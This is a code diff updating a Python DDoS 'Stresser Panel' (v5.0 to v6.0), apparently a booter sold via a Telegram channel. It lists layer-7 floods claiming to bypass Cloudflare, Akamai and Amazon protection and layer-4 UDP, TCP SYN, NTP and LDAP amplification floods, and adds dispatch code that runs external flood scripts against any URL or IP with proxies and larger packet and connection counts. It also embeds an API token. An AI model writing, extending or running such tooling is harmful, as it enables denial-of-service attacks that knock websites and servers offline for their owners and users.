@@ -95,7 +95,7 @@ def get_url_info(url, token):
         return None
                                                                                                                                                                                                                                                                                    
 def si(): 
-    print('         [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v5.0')
+    print('         [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v6.0')
     print("")                
 
 def layer7():
@@ -107,18 +107,18 @@ def layer7():
     print("➤ HTTPBYPASS    : HIGHREQ BYPASS CLOUDFLARE 99% ")
     print("➤ CFGAS          : LOWREQ HTTP1 BYPASS CLOUDFLARE 99%")
     print("➤ HTTP-STORM    : HIGHREQ BYPASS CLOUDFLARE 95%")
-    print("➤ TLSV1           : NO PROTECT")
-    print("➤ TLSV2           : NO PROTECT")
-    print("➤ CF-BYPASS      : LOWREQ HTTP1 BYPASS CLOUDFLARE 99%")
+    print("➤ H2-FLOW           : HIGHREQ BYPASS CLOUDFLARE 99%")
+    print("➤ TLS           : NO PROTECT")
+    print("➤ CF-BYPASS      : HIGHREQ AUTOMATED BYPASS CLOUDFLARE 99%")
     print("➤ CF-FLOOD       : BYPASS CLOUDFLARE & AMAZON & AKAMAI 99%")
-    print("➤ HTTPGET        : BYPASS CLOUDFLARE 60%")
+    print("➤ HTTPGET        : LOWREQ BYPASS CLOUDFLARE LIKEHUMAN 99%")
     print("➤ CRASH          : NO PROTECT")
     print("➤ HTTPFLOOD     : NO PROTECT")
     print("➤ H2-UAM         : NO PROXY LOWREQ BYPASS UAM & CAPTCHA 99%")
     print("➤ H2-HOLD        :  BYPASS CLOUDFLARE 99%")
-    print("➤ H2-BYPASS      : BYPASS CLOUDFLARE 30%")    
+    print("➤ H2-BYPASS      : BYPASS CLOUDFLARE 99%")    
     print("➤ SLOW           : NO PROTECT")
-    print("➤ HTTPS-SPOOF   : NO PROTECT KHUSUS SPOOF SSL")
+    print("➤ H2-MIRAGE   : HIGHREQ BYPASS CLOUDFLARE LIKEHUMAN 99%")
     print("--------------------------------------------------")
 
 # Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.
@@ -135,7 +135,7 @@ def layer4():
     print("➤ STD          : UDP&TCPSYN&ICMP MIX")
     print("➤ UDPBYPASS    : BYPASS UDP PROTECT")
     print("➤ DESTROY      : UDP FLOOD")
-    print("➤ HOME         : UDP FLOOD")
+    print("➤ HOMEKILL         : UDP FLOOD")
     print("➤ GOD          : UDP FLOOD")
     print("➤ SLOWLORIS    : TCP SLOW")
     print("➤ FLUX         : TCP SYN")
@@ -173,7 +173,7 @@ def usage():
     print("➤ H2-HOLD       : H2-HOLD https://target.com 60")
     print("➤ H2-BYPASS    : H2-BYPASS https://target.com 60")
     print("➤ SLOW          : SLOW https://target.com 60")
-    print("➤ HTTPS-SPOOF   : HTTPS-SPOOF https://target.com 60")
+    print("➤ H2-MIRAGE   : H2-MIRAGE https://target.com 60")
 
     print("\n--- METODE LAYER 4 ---")
     print("➤ UDP          : UDP 1.1.1.1 port")
@@ -182,7 +182,7 @@ def usage():
     print("➤ STD          : STD 1.1.1.1 port")
     print("➤ UDPBYPASS    : UDPBYPASS 1.1.1.1 port")
     print("➤ DESTROY      : DESTROY 1.1.1.1 port 60")
-    print("➤ HOME         : HOME 1.1.1.1 port 65500 60")
+    print("➤ HOMEKILL         : HOMEKILL 1.1.1.1 port 65500 60")
     print("➤ GOD          : GOD 1.1.1.1 port 60")
     print("➤ SLOWLORIS    : SLOWLORIS 1.1.1.1 port")
     print("➤ FLUX         : FLUX 1.1.1.1 port 250")
@@ -307,7 +307,7 @@ def menu():
     sys.stdout.flush()
     
     # Pesan informasi awal (Teks polos)
-    header_text = ' [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v5.0 '
+    header_text = ' [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v6.0 '
     print(header_text)
     print("")
 
@@ -408,7 +408,7 @@ def main():
     
 # LAYER 4 METHODS   
 
-        elif "udpbypass" in cnc:
+        elif "UDPBYPASS" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -423,7 +423,7 @@ def main():
                 print('Usage: udpbypass <ip> <port>')
                 print('Example: udpbypass 1.1.1.1 80')
 
-        elif "stdv2" in cnc:
+        elif "STDV2" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -438,7 +438,7 @@ def main():
                 print('Usage: stdv2 <ip> <port>')
                 print('Example: stdv2 1.1.1.1 80')
 
-        elif "flux" in cnc:
+        elif "FLUX" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -454,7 +454,7 @@ def main():
                 print('Usage: flux <ip> <port> <threads>')
                 print('Example: flux 1.1.1.1 80 250')
 
-        elif "slowloris" in cnc:
+        elif "SLOWLORIS" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -469,7 +469,7 @@ def main():
                 print('Usage: slowloris <ip> <port>')
                 print('Example: slowloris 1.1.1.1 80')
 
-        elif "god" in cnc:
+        elif "GOD" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -485,7 +485,7 @@ def main():
                 print('Usage: god <ip> <port> <time>')
                 print('Example: god 1.1.1.1 80 60')
 
-        elif "destroy" in cnc:
+        elif "DESTROY" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -501,7 +501,7 @@ def main():
                 print('Usage: destroy <ip> <port> <time>')
                 print('Example: destroy 1.1.1.1 80 60')
 
-        elif "std" in cnc:
+        elif "STD" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -516,13 +516,13 @@ def main():
                 print('Usage: std <ip> <port>')
                 print('Example: std 1.1.1.1 80')
 
-        elif "home" in cnc:
+        elif "HOMEKILL" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 psize = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'perl home.pl {ip} {port} 8 {time}')
+                os.system(f'perl home.pl {ip} {port} 65500 {time}')
                 token = "727e8c2fa5b07c"
                 ip = f"{ip}"
                 info = get_ip_info(token, ip)
@@ -530,10 +530,10 @@ def main():
             except Exception as e:
                 print(f"Error executing command: {e}")
             except IndexError:
-                print('Usage: home <ip> <port> <packet_size> <time>')
-                print('Example: home 1.1.1.1 80 65500 60')
+                print('Usage: homekill <ip> <port> <packet_size> <time>')
+                print('Example: homekill 1.1.1.1 80 65500 60')
 
-        elif "udp" in cnc:
+        elif "UDP" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -548,7 +548,7 @@ def main():
                 print('Usage: udp <ip> <port>')
                 print('Example: udp 1.1.1.1 80')
 
-        elif "nfo-killer" in cnc:
+        elif "NFO-KILLER" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -565,14 +565,14 @@ def main():
                 print('Usage: nfo-killer <ip> <port> <threads> <time>')
                 print('Example: nfo-killer 1.1.1.1 80 850 60')
 
-        elif "ovh-raw" in cnc:
+        elif "OVH-RAW" in cnc:
             try:
                 method = cnc.split()[1]
                 ip = cnc.split()[2]
                 port = cnc.split()[3]
                 time = cnc.split()[4]
                 conns = cnc.split()[5]
-                os.system(f'./ovh-raw {method} {ip} {port} {time} 8')
+                os.system(f'./ovh-raw {method} {ip} {port} {time} 8500')
                 token = "727e8c2fa5b07c"
                 ip = f"{ip}"
                 info = get_ip_info(token, ip)
@@ -583,14 +583,14 @@ def main():
                 print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                 print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
 
-        elif "tcp" in cnc:
+        elif "TCP" in cnc:
             try:
                 method = cnc.split()[1]
                 ip = cnc.split()[2]
                 port = cnc.split()[3]
                 time = cnc.split()[4]
                 conns = cnc.split()[5]
-                os.system(f'./100UP-TCP {method} {ip} {port} {time} 8')
+                os.system(f'./100UP-TCP {method} {ip} {port} {time} 8500')
                 token = "727e8c2fa5b07c"
                 ip = f"{ip}"
                 info = get_ip_info(token, ip)
@@ -601,7 +601,7 @@ def main():
                 print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                 print('Example: tcp GET 1.1.1.1 80 60 8500')
                 
-        elif "ovh-beam" in cnc:
+        elif "OVH-BEAM" in cnc:
             try:
                 method = cnc.split()[1]
                 ip = cnc.split()[2]
@@ -618,7 +618,7 @@ def main():
                 print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                 print('Example: ovh-beam GET 51.38.92.223 80 60')
                 
-        elif "overflow" in cnc:
+        elif "OVERFLOW" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -634,7 +634,7 @@ def main():
                 print('Usage: overflow <ip> <port> <threads>')
                 print('Example: overflow 1.1.1.1 80 5000')
                
-        elif "samp" in cnc:
+        elif "SAMP" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -649,7 +649,7 @@ def main():
                 print('Usage: samp <ip> <port>')
                 print('Example: samp 1.1.1.1 7777')
 
-        elif "ldap" in cnc:
+        elif "LDAP" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -666,7 +666,7 @@ def main():
                 print('Usage: ldap <ip> <port> <threads> <time>')
                 print('Example: ldap 1.1.1.1 80 650 60')
 
-        elif "minecraft" in cnc:
+        elif "MINECRAFT" in cnc:
             try:
                 ip = cnc.split()[1]
                 throttle = cnc.split()[2]
@@ -683,7 +683,7 @@ def main():
                 print('Usage: minecraft <ip> <throttle> <threads> <time>')
                 print('Example: minecraft 1.1.1.1 5000 500 60')
 
-        elif "ovh-amp" in cnc:
+        elif "OVH-AMP" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -698,7 +698,7 @@ def main():
                 print('Usage: ovh-amp <ip> <port>')
                 print('Example: ovh-amp 1.1.1.1 80')
                 
-        elif "ntp" in cnc:
+        elif "NTP" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -717,21 +717,19 @@ def main():
                 
 # LAYER 7 METHODS
     
-        elif "https-spoof" in cnc:
+        elif "H2-MIRAGE" in cnc:
             try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                thread = cnc.split()[3]
-                os.system(f'python3 https-spoof.py {url} {time} 8')
+                url, time = cnc.split()[1:3]
+                os.system(f'node h2-mirage.js GET {url} {time} 100 8 proxies.txt')
                 url = f"{url}"
                 token = "727e8c2fa5b07c"
                 result = get_url_info(url, token)
                 print(result) 
             except IndexError:
-                print('Usage: https-spoof <url> <time> <threads>')
-                print('Example: https-spoof http://vailon.com 60 500')     
+                print('Usage: H2-MIRAGE <url> <time> <threads>')
+                print('Example: H2-MIRAGE http://target.com 60')     
                 
-        elif "h2-uam" in cnc:
+        elif "H2-UAM" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]               
@@ -744,7 +742,7 @@ def main():
                 print('Usage: h2-uam <url> <time>')
                 print('Example: h2-uam https://lol.com 60')                             
         
-        elif "slow" in cnc:
+        elif "SLOW" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -771,7 +769,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
                 
-        elif "cf-flood" in cnc:
+        elif "CF-FLOOD" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -798,7 +796,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")        
                 
-        elif "h2-hold" in cnc:
+        elif "H2-HOLD" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -825,7 +823,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
     
-        elif "h2-bypass" in cnc:
+        elif "H2-BYPASS" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -852,7 +850,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
         
-        elif "cfgas" in cnc:
+        elif "CFGAS" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -879,7 +877,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
 
-        elif "httpbypass" in cnc:
+        elif "HTTPBYPASS" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -905,12 +903,12 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
 
-        elif "tlsv1" in cnc:
+        elif "H2-FLOW" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                                
-               os.system(f'node httpbypassv2.js {url} {time} 100 8 proxies.txt')        
+               os.system(f'node h2-flow.js {url} {time} 100 8 proxies.txt')        
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -932,7 +930,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
                 
-        elif "tlsv2" in cnc:
+        elif "TLS" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -959,7 +957,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")            
 
-        elif "cf-bypass" in cnc:
+        elif "CF-BYPASS" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
@@ -986,7 +984,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
 
-        elif "crash" in cnc:
+        elif "CRASH" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
@@ -1004,7 +1002,7 @@ def main():
                 print('Usage: crash <url> METHODS<GET/POST>')
                 print('Example: crash http://example.com GET')
 
-        elif "httpflood" in cnc:
+        elif "HTTPFLOOD" in cnc:
             try:
                 url = cnc.split()[1]
                 thread = cnc.split()[2]
@@ -1024,13 +1022,12 @@ def main():
                 print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                 print('Example: httpflood http://example.com 15000 get 60')
 
-        elif "httpget" in cnc:
+        elif "HTTPGET" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node httpget GET {url} {time} 100 8 proxies.txt')
-               os.system(f'node httpgetv2 GET {url} {time} 100 8 proxies.txt')
+               os.system(f'node httpget GET {url} {time} 100 8 proxies.txt')              
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1052,7 +1049,7 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
                 
-        elif "http-storm" in cnc:
+        elif "HTTP-STORM" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
